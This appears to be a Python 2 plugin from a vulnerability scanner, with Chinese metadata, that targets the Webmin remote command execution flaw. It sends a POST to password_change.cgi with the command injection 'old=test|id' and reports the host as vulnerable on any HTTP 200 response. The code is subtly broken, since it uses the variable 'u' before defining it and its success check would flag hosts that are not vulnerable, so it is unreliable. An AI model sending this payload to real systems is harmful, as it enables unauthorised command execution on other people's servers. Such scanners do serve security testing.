# coding:utf-8

import requests

def get_plugin_info():
    plugin_info = {
        "name": "Webmin 远程命令执行漏洞",
        "info": "Webmin是一个用于管理类Unix系统的管理配置工具，具有Web页面。在其找回密码页面中，存在一处无需权限的命令注入漏洞，通过这个漏洞攻击者即可以执行任意系统命令",
        "level": "高危",
        "type": "RCE",
        "author": "taro",
        "url": "https://blog.firosolutions.com/exploits/webmin/",
        "keyword": "all:webmin",
        "source": 1
    }
    return plugin_info


def check(host, port, timeout):
    header_list = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
        'Connection': 'close',
        'Cookie': 'redirect=1; testing=1; sid=x; sessiontest=1',
        'Referer': u +'/session_login.cgi',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    data = 'user=root&pam=&expired=2&old=test|id&new1=test2&new2=test2'
    u = "http://%s:%d" % (host, int(port))
    payload_url = '/password_change.cgi'
    url = u + payload_url

    try:
        res = requests.post(url=url,data=data ,headers=header_list, timeout=timeout)
        if res.status_code==200 :
            info = '存在Webmin 远程命令执行漏洞: %s' % payload_url
            return info

    except Exception, e:
        pass
